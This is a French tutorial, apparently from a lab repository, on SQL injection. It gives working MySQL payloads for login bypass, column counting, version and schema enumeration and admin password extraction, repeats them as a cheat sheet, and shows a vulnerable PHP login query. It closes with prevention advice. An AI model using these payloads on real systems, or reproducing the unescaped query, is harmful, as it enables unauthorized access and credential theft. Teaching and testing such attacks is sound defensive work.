
# Introduction et Techniques d'Injection SQL

# 1 - Qu'est-ce que l'injection SQL?

L'injection SQL est une technique de piratage qui permet à un attaquant d'exécuter des commandes SQL malveillantes en manipulant les entrées d'une application. Cela peut permettre d'accéder à des données sensibles, de modifier ou de supprimer des informations dans la base de données.

# 2 -  Exemple de l'injection SQL

## 2.1. Contourner l'authentification avec `OR 1=1`

**Commande :**
```sql
' OR 1=1 #
```

**Explication :**
- **Contexte:** Supposons que vous avez un formulaire de connexion avec deux champs : nom d'utilisateur et mot de passe.
- **Objectif:** Se connecter sans fournir les bonnes informations d'identification.
- **Fonctionnement:** La condition `1=1` est toujours vraie. Par conséquent, en ajoutant cette condition à la requête SQL, l'authentification sera contournée.

**Exemple :**
Imaginons que la requête SQL de connexion soit :
```sql
SELECT * FROM utilisateurs WHERE nom_utilisateur = 'admin' AND mot_de_passe = 'motdepasse';
```

Si l'attaquant entre `' OR 1=1 #` dans le champ du mot de passe, la requête devient :
```sql
SELECT * FROM utilisateurs WHERE nom_utilisateur = 'admin' AND mot_de_passe = '' OR 1=1 #';
```

La partie `OR 1=1` rend la condition toujours vraie, permettant ainsi l'accès sans le mot de passe correct.

## 2.2. Déterminer le nombre de colonnes

**Commande :**
```sql
' OR 1=1 ORDER BY x #
```

**Explication :**
- **Contexte:** Pour injecter des données correctement, il est important de connaître le nombre de colonnes de la table ciblée.
- **Objectif:** Trouver le nombre exact de colonnes dans la table.
- **Fonctionnement:** En augmentant `x` jusqu'à ce qu'une erreur survienne, l'attaquant peut déterminer le nombre de colonnes.

**Exemple :**
Si la requête de base est :
```sql
SELECT * FROM articles WHERE id = 1;
```

L'attaquant essaie différentes valeurs pour `x` :
```sql
SELECT * FROM articles WHERE id = 1 OR 1=1 ORDER BY 1; -- Pas d'erreur
SELECT * FROM articles WHERE id = 1 OR 1=1 ORDER BY 2; -- Pas d'erreur
SELECT * FROM articles WHERE id = 1 OR 1=1 ORDER BY 3; -- Pas d'erreur
SELECT * FROM articles WHERE id = 1 OR 1=1 ORDER BY 4; -- Erreur
```

Lorsqu'une erreur survient à `ORDER BY 4`, cela indique que la table a 3 colonnes.

## 2.3. Obtenir la version de la base de données

**Commande :**
```sql
' OR 1=1 UNION SELECT 0,@@version,2 ORDER BY id; #
```

**Explication :**
- **Contexte:** Savoir la version du SGBD peut aider l'attaquant à adapter ses techniques d'exploitation.
- **Objectif:** Obtenir la version actuelle de la base de données.
- **Fonctionnement:** Utilisation de `UNION SELECT` pour combiner les résultats de la requête injectée avec ceux de la requête initiale.

**Exemple :**
Requête de base :
```sql
SELECT id, titre, contenu FROM articles WHERE id = 1;
```

Injection :
```sql
SELECT id, titre, contenu FROM articles WHERE id = 1 OR 1=1 UNION SELECT 0,@@version,2 ORDER BY id;
```

Résultat :
| id | titre                  | contenu |
|----|------------------------|---------|
| 0  | 5.7.32-log             | 2       |
| ...| ...                    | ...     |

La version de la base de données est `5.7.32-log`.

## 2.4. Lister les noms des tables

**Commande :**
```sql
' OR 1=1 UNION SELECT 0, GROUP_CONCAT(table_name), 2 FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY 1; #
```

**Explication :**
- **Contexte:** Connaître les tables présentes dans la base de données permet d'identifier des cibles pour des attaques plus spécifiques.
- **Objectif:** Obtenir les noms des tables dans la base de données courante.
- **Fonctionnement:** Utilisation de `GROUP_CONCAT` pour concaténer les noms de tables.

**Exemple :**
Requête de base :
```sql
SELECT id, titre, contenu FROM articles WHERE id = 1;
```

Injection :
```sql
SELECT id, titre, contenu FROM articles WHERE id = 1 OR 1=1 UNION SELECT 0, GROUP_CONCAT(table_name), 2 FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY 1;
```

Résultat :
| id | titre                                             | contenu |
|----|---------------------------------------------------|---------|
| 0  | utilisateurs,articles,produits,commandes,...      | 2       |

Les tables présentes sont `utilisateurs`, `articles`, `produits`, `commandes`, etc.

## 2.5. Lister les noms des colonnes d'une table spécifique

**Commande :**
```sql
' OR 1=1 UNION SELECT 0, GROUP_CONCAT(column_name), 2 FROM information_schema.columns WHERE table_name="admin" ORDER BY 1; #
```

**Explication :**
- **Contexte:** Connaître les colonnes d'une table spécifique est crucial pour extraire des données précises.
- **Objectif:** Obtenir les noms des colonnes de la table nommée "admin".
- **Fonctionnement:** Utilisation de `GROUP_CONCAT` pour concaténer les noms de colonnes.

**Exemple :**
Requête de base :
```sql
SELECT id, titre, contenu FROM articles WHERE id = 1;
```

Injection :
```sql
SELECT id, titre, contenu FROM articles WHERE id = 1 OR 1=1 UNION SELECT 0, GROUP_CONCAT(column_name), 2 FROM information_schema.columns WHERE table_name="admin" ORDER BY 1;
```

Résultat :
| id | titre                                 | contenu |
|----|---------------------------------------|---------|
| 0  | id,nom_utilisateur,motdepasse,email,... | 2       |

Les colonnes de la table `admin` sont `id`, `nom_utilisateur`, `motdepasse`, `email`, etc.

## 2.6. Obtenir le mot de passe de l'administrateur

**Commande :**
```sql
' OR 1=1 UNION SELECT 0, motdepasse, 2 FROM `admin` ORDER BY id; #
```

**Explication :**
- **Contexte:** Accéder aux informations d'identification sensibles.
- **Objectif:** Obtenir le mot de passe de l'administrateur de la table `admin`.
- **Fonctionnement:** Utilisation de `UNION SELECT` pour extraire la colonne `motdepasse`.

**Exemple :**
Requête de base :
```sql
SELECT id, titre, contenu FROM articles WHERE id = 1;
```

Injection :
```sql
SELECT id, titre, contenu FROM articles WHERE id = 1 OR 1=1 UNION SELECT 0, motdepasse, 2 FROM `admin` ORDER BY id;
```

Résultat :
| id | titre          | contenu  |
|----|----------------|----------|
| 0  | Motdepasse123  | 2        |

Le mot de passe de l'administrateur est `Motdepasse123`.

## Sécurité et Prévention

L'injection SQL est une menace sérieuse pour la sécurité des applications web. Voici quelques bonnes pratiques pour protéger vos applications contre ce type d'attaques :

1. **Utiliser des requêtes préparées (paramétrées)** : Les requêtes préparées assurent que les entrées de l'utilisateur ne peuvent pas altérer la structure des requêtes SQL.
2. **Valider et nettoyer les entrées de l'utilisateur** : Assurez-vous que toutes les entrées de l'utilisateur sont correctement validées et nettoyées avant d'être utilisées dans des requêtes SQL.
3. **Limiter les privilèges de la base de données** : Utilisez des comptes de base de données avec des privilèges limités pour les opérations spécifiques, et évitez d'utiliser des comptes avec des droits d'administrateur pour des tâches régulières.
4. **Utiliser des outils de détection d'injections SQL** : Mettez en place des outils de détection et de prévention des intrusions pour identifier et bloquer les tentatives d'injection SQL.

# Annexe 1  :
```sql
Injection SQL :

' OR 1=1 #


Obtenir le nombre de colonnes :

' OR 1=1 order by x # (avec x=1,2,3, etc jusqu'à l'impossibilité de se connecter qui donnera le nbre de colonnes)


Obtenir la version de la base de données :

' OR 1=1 union select 0,@@version,2 order by id; #


Obtenir le nom des tables :

' OR 1=1 union select 0, group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database() order by 1; #


Obtenir le nom des colonnes de la table :

' OR 1=1 union select 0, group_concat(column_name),2 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name="admin" order by 1; #


Obtenir le mot de passe de l'administrateur :

' OR 1=1 union select 0,motdepasse,2 FROM `admin` order by id; #

```

# Annnexe 2 - ligne vulnérable (site ==> admin==> index.php ==> ligne 13


![image](https://github.com/user-attachments/assets/e0627674-415b-4a37-9d09-4cdbeb575d83)

![image](https://github.com/user-attachments/assets/4d7c5f4b-34d6-4484-bb4e-718f72a855dc)


```
		$rows=$mysqli->query("SELECT * FROM `admin` WHERE `nomutilisateur`='" . $_POST['nomutilisateur'] . "' AND `motdepasse`='" . md5($_POST['motdepasse']) . "' LIMIT 1");//ATTENTION: pas d'échappment des entrées utilisateur (Injection SQL)
```

```
		$rows=$mysqli->query("SELECT * FROM `admin` WHERE `nomutilisateur`='
```

```
' OR 1=1 #
```

